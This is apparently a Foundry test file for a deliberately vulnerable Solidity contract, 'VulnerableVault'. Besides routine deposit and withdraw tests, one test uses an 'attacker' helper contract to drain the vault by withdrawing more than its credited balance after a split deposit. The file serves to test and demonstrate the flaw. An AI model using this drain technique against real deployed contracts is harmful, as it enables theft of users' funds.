// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

contract VaultWithdrawer {
    VulnerableVault internal immutable vault;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function withdraw(uint256 amount) external {
        vault.withdraw(amount);
    }

    function balanceInVault() external view returns (uint256) {
        return vault.balances(address(this));
    }

    receive() external payable {}
}

contract VulnerableVaultTest is Test {
    VulnerableVault public vuVault;

    function setUp() public {
        vuVault = new VulnerableVault();
    }

    function testDeposit() public {
        vm.deal(address(1), 1 ether);
        vm.prank(address(1));
        vuVault.deposit{value: 1 ether}();
        assertEq(vuVault.balances(address(1)), 1 ether);
        assertEq(vuVault.totalDeposits(), 1 ether);
    }

    function testWithdraw() public {
        vm.deal(address(1), 1 ether);

        vm.startPrank(address(1));
        vuVault.deposit{value: 1 ether}();
        vuVault.withdraw(1 ether);
        vm.stopPrank();

        assertEq(vuVault.balances(address(1)), 0);
        assertEq(vuVault.totalDeposits(), 0);
    }

    function testDrainVaultWithoutPrankingOwnerOrVault() public {
        vm.deal(address(this), 344 ether);

        VulnerableVault fundedVault = new VulnerableVault{value: 10 ether}();
        VaultWithdrawer owner = new VaultWithdrawer(fundedVault);
        VaultWithdrawer attacker = new VaultWithdrawer(fundedVault);

        fundedVault.splitDeposit{value: 334 ether}(address(owner), address(attacker));

        uint256 ownerCredit = fundedVault.balances(address(owner));
        uint256 remainingVaultBalanceAfterOwnerWithdrawal = address(fundedVault).balance - ownerCredit;

        owner.withdraw(ownerCredit);
        attacker.withdraw(remainingVaultBalanceAfterOwnerWithdrawal);

        assertEq(address(fundedVault).balance, 0);
        assertEq(address(owner).balance, ownerCredit);
        assertEq(address(attacker).balance, remainingVaultBalanceAfterOwnerWithdrawal);
        assertGt(fundedVault.balances(address(attacker)), 0);
    }
}
